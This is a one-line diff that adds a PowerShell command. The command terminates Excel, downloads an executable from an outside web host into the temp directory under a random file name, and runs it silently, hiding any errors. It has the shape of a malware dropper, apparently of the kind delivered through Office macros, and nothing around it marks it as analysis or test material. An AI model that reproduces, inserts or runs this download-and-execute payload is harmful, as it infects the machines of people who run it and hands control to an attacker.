@@ -1,0 +1,1 @@
+try{kill -processname EXCEL; (New-Object System.Net.WebClient).DownloadFile('http://translink.lk/images/98.exe',$env:temp+'\eDQVvNEc.exe');(New-Object -com Shell.Application).ShellExecute($env:temp+'\eDQVvNEc.exe');}catch {}
